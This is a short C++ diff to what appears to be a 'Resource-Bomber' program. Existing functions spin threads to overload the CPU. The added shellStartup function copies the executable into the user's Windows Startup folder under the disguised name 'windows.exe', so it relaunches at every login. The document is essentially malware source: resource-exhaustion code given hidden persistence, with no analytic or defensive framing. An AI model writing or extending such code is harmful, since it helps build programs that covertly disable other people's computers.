@@ -1,4 +1,7 @@
 #include "app.h"
+#include <filesystem>
+#include <format>
+namespace fs = std::filesystem;
 
 void cpuOverloader() {
     long long int a, j = 0;
@@ -15,4 +18,9 @@ void overloader() {
     thread1.join();
     thread3.join();
     thread2.join();
+}
+
+void shellStartup() {
+    std::string shellPath = std::format("C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows.exe", getenv("username"));
+    fs::copy_file("Resource-Bomber.exe",shellPath, fs::copy_options::update_existing);
 }
